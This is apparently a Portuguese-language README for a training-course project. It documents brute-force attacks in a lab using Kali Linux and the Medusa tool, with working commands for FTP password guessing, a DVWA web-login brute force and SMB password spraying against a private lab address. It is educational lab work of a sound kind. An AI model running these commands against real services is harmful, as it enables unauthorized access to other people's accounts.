# projeto-medusa
Uso do Kali Linux + Medusa em ambientes vulneráveis 

Projeto de Segurança com Kali Linux e Medusa

Introdução

Este projeto foi desenvolvido como parte do desafio da DIO para explorar ataques de força bruta em ambientes controlados. Utilizei Kali Linux e a ferramenta Medusa contra serviços vulneráveis, com o objetivo de compreender vulnerabilidades comuns e propor medidas de mitigação.

Ataque de Força Bruta em FTP

Comando utilizado no bash para acesso obtido com credenciais fracas: medusa -h 192.168.56.101 -u admin -P wordlists/simples.txt -M ftp

Resultado do Brute Force em Formulário Web (DVWA) em login bem-sucedido após algumas tentativas udando o seguinte comando: medusa -h 192.168.56.101 -u admin -P wordlists/simples.txt -M web-form -m FORM:"/dvwa/login.php:username=^USER^&password=^PASS^:Login failed"

Password Spraying em SMB

Resultado da enumeração de usuários e acesso com senha fraca udando o seguinte comando: medusa -h 192.168.56.101 -U wordlists/users.txt -p 123456 -M smbnt
